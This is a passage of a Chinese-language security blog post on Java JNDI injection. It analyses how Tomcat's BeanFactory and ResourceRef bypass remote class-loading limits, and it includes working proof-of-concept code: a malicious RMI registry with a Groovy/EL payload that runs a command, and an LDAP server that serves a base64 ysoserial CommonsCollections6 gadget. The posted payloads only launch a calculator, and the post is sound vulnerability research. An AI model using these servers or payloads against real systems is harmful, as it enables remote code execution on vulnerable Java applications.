+<blockquote>
+<p>This class represents a reference to an object that is found outside of the naming/directory system.<br>Reference provides a way of recording address information about objects which themselves are not directly bound to the naming/directory system.<br>A Reference consists of an ordered list of addresses and class information about the object being referenced. Each address in the list identifies a communications endpoint for the same conceptual object. The “communications endpoint” is information that indicates how to contact the object. It could be, for example, a network address, a location in memory on the local machine, another process on the same machine, etc. The order of the addresses in the list may be of significance to object factories that interpret the reference.<br>Multiple addresses may arise for various reasons, such as replication or the object offering interfaces over more than one communication mechanism. The addresses are indexed starting with zero.<br>A Reference also contains information to assist in creating an instance of the object to which this Reference refers. It contains the class name of that object, and the class name and location of the factory to be used to create the object. The class factory location is a space-separated list of URLs representing the class path used to load the factory. When the factory class (or any class or resource upon which it depends) needs to be loaded, each URL is used (in order) to attempt to load the class.<br>A Reference instance is not synchronized against concurrent access by multiple threads. Threads that need to access a single Reference concurrently should synchronize amongst themselves and provide the necessary locking.</p>
+<p>Since:<br>1.3<br>See Also:<br>RefAddr, StringRefAddr, BinaryRefAddr<br>Author:<br>Rosanna Lee, Scott Seligman</p>
+</blockquote>
+<ul>
+<li>RefAddr, StringRefAddr, BinaryRefAddr ， 这几个类都是描述如何去连接对方的类。</li>
+<li>ResourceRef，这其实就是Reference的子类</li>
+</ul>
+<pre><code class="java">// org.apache.naming.ResourceRef
+/**
+ * Represents a reference address to a resource.
+ *
+ * @author Remy Maucherat
+ */
+public class ResourceRef extends AbstractRef&#123;
+  public ResourceRef(String resourceClass, String description,
+                     String scope, String auth, boolean singleton,
+                     String factory, String factoryLocation) &#123;
+    // 这里看到实际还是调用了父类方法
+    super(resourceClass, factory, factoryLocation);
+    StringRefAddr refAddr = null;
+  
+&#125;
+
+public abstract class AbstractRef extends Reference
+</code></pre>
+<p>所以最重要的是要创建的类<code>javax.el.ELProcessor</code> 和 工厂类 <code>org.apache.naming.factory.BeanFactory</code></p>
+<p>为什么要用ResourceRef 这个类，因为在<code>org.apache.naming.factory.BeanFactory#getObjectInstance</code> 这个工厂创建类的方法中有限制，必须要是<code>ResourceRef</code>的实例。</p>
+<pre><code class="java">    /**
+     * Create a new Bean instance.
+     *
+     * @param obj The reference object describing the Bean
+     */
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx,
+                                    Hashtable&lt;?,?&gt; environment)
+        throws NamingException &#123;
+                
+          // 必须要是ResourceRef的实例
+        if (obj instanceof ResourceRef) &#123;
+
+            try &#123;
+
+                Reference ref = (Reference) obj;
+                String beanClassName = ref.getClassName();
+                Class&lt;?&gt; beanClass = null;
+</code></pre>
+<p>分析：</p>
+<ol>
+<li>绕过的地方，在<code>com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code>中，远程加载地址为null，所以无法这个条件不会成立</li>
+</ol>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220607001622783.png" alt="image-20220607001622783"></p>
+<ol start="2">
+<li>如何执行代码，注意这个refInfo的参数</li>
+</ol>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220607002349056.png" alt="image-20220607001622783"></p>
+<ol start="3">
+<li>构造完ELProcessor</li>
+</ol>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220607002746613.png" alt="image-20220607002746613"></p>
+<ol start="4">
+<li>构造RCE</li>
+</ol>
+<pre><code class="java"> /* Look for properties with explicitly configured setter */
+                RefAddr ra = ref.get(&quot;forceString&quot;);
+                Map&lt;String, Method&gt; forced = new HashMap&lt;&gt;();
+                String value;
+
+                if (ra != null) &#123;
+                    value = (String)ra.getContent();
+                    Class&lt;?&gt; paramTypes[] = new Class[1];
+                    paramTypes[0] = String.class;
+                    String setterName;
+                    int index;
+
+                    /* Items are given as comma separated list */
+                    for (String param: value.split(&quot;,&quot;)) &#123;
+                        param = param.trim();
+                        /* A single item can either be of the form name=method
+                         * or just a property name (and we will use a standard
+                         * setter) */
+                        index = param.indexOf(&#39;=&#39;);
+                        if (index &gt;= 0) &#123;
+                            setterName = param.substring(index + 1).trim();
+                            param = param.substring(0, index).trim();
+                        &#125; else &#123;
+                            setterName = &quot;set&quot; +
+                                         param.substring(0, 1).toUpperCase(Locale.ENGLISH) +
+                                         param.substring(1);
+                        &#125;
+                        try &#123;
+                            forced.put(param,
+                                       beanClass.getMethod(setterName, paramTypes));
+                        &#125; catch (NoSuchMethodException|SecurityException ex) &#123;
+                            throw new NamingException
+                                (&quot;Forced String setter &quot; + setterName +
+                                 &quot; not found for property &quot; + param);
+                        &#125;
+                    &#125;
+                &#125;
+
+                Enumeration&lt;RefAddr&gt; e = ref.getAll();
+
+                while (e.hasMoreElements()) &#123;
+
+                    ra = e.nextElement();
+                    String propName = ra.getType();
+
+                    if (propName.equals(Constants.FACTORY) ||
+                        propName.equals(&quot;scope&quot;) || propName.equals(&quot;auth&quot;) ||
+                        propName.equals(&quot;forceString&quot;) ||
+                        propName.equals(&quot;singleton&quot;)) &#123;
+                        continue;
+                    &#125;
+
+                    value = (String)ra.getContent();
+
+                    Object[] valueArray = new Object[1];
+
+                    /* Shortcut for properties with explicitly configured setter */
+                    Method method = forced.get(propName);
+                    if (method != null) &#123;
+                        valueArray[0] = value;
+                        try &#123;
+                            method.invoke(bean, valueArray);
+                        &#125; catch (IllegalAccessException|
+                                 IllegalArgumentException|
+                                 InvocationTargetException ex) &#123;
+                            throw new NamingException
+                                (&quot;Forced String setter &quot; + method.getName() +
+                                 &quot; threw exception for property &quot; + propName);
+                        &#125;
+                        continue;
+                    &#125;
+</code></pre>
+<p>通过上面的解析，最终会执行EL表达式</p>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220607003040593.png" alt="image-20220607003040593"></p>
+<h3 id="0x3-1-2-groovy"><a href="#0x3-1-2-groovy" class="headerlink" title="0x3.1.2 groovy"></a>0x3.1.2 groovy</h3><p><a target="_blank" rel="noopener" href="https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html">https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html</a></p>
+<pre><code class="java">public static void main(String[] args) throws Exception &#123;
+    System.out.println(&quot;Creating evil RMI registry on port 1097&quot;);
+    Registry registry = LocateRegistry.createRegistry(1097);
+    ResourceRef ref = new ResourceRef(&quot;groovy.lang.GroovyClassLoader&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);
+    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=parseClass&quot;));
+    String script = &quot;@groovy.transform.ASTTest(value=&#123;\n&quot; +
+        &quot;    assert java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)\n&quot; +
+        &quot;&#125;)\n&quot; +
+        &quot;def x\n&quot;;
+    ref.add(new StringRefAddr(&quot;x&quot;,script));
+
+    ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
+    registry.bind(&quot;Object&quot;, referenceWrapper);
+&#125;
+</code></pre>
+<h2 id="0x3-2-LDAP-本地反序列化Gadget"><a href="#0x3-2-LDAP-本地反序列化Gadget" class="headerlink" title="0x3.2 LDAP 本地反序列化Gadget"></a>0x3.2 LDAP 本地反序列化Gadget</h2><p>POC:</p>
+<pre><code class="java">// LDAPServer
+package jndi;
+import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.text.ParseException;
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPException;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+import com.unboundid.util.Base64;
+
+public class LDAPServer &#123;
+    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;
+
+    public static void main ( String[] args ) &#123;
+        int port = 1389;
+        try &#123;
+            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+            config.setListenerConfigs(new InMemoryListenerConfig(
+                    &quot;listen&quot;, //$NON-NLS-1$
+                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+            config.addInMemoryOperationInterceptor(new OperationInterceptor());
+            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$
+            ds.startListening();
+        &#125;
+        catch ( Exception e ) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+
+    // in this class remove the construct
+    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;
+        @Override
+        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;
+            String base = &quot;Exploit&quot;;
+            Entry e = new Entry(base);
+            try &#123;
+                sendResult(result, base, e);
+            &#125;
+            catch ( Exception e1 ) &#123;
+                e1.printStackTrace();
+            &#125;
+        &#125;
+
+        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException, ParseException, ParseException &#123;
+            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);
+            // java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections6 &#39;open /System/Applications/Calculator.app&#39;|base64
+            e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AChvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;));
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220607005341405.png" alt="image-20220607005341405"></p>
+<ol>
+<li><code>com.sun.jndi.ldap.LdapCtx#c_lookup</code> 如果className不为空则decodeObject</li>
+</ol>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220607005652357.png" alt="image-20220607005652357"></p>
+<ol start="2">
+<li>decodeObject，根据属性判断如何解码</li>
+</ol>
+<pre><code class="java">static final String[] JAVA_ATTRIBUTES = new String[]&#123;&quot;objectClass&quot;, &quot;javaSerializedData&quot;, &quot;javaClassName&quot;, &quot;javaFactory&quot;, &quot;javaCodeBase&quot;, &quot;javaReferenceAddress&quot;, &quot;javaClassNames&quot;, &quot;javaRemoteLocation&quot;&#125;;
+</code></pre>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220607010506298.png" alt="image-20220607010506298"></p>
+<p><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p>
+<p><a target="_blank" rel="noopener" href="https://81.68.118.217/index.php/archives/62/">https://81.68.118.217/index.php/archives/62/</a></p>
+</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2022/05/26/1%20Acid%20Burn%20f9346fdb358c4f61a8da59806a00acac/">prev</a><a class="next" href="/2022/05/18/Java/Commons%20Collections/">next</a></div><div class="copyright"><p>&copy; 2023 <a href="http://example.com">Hurn</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>
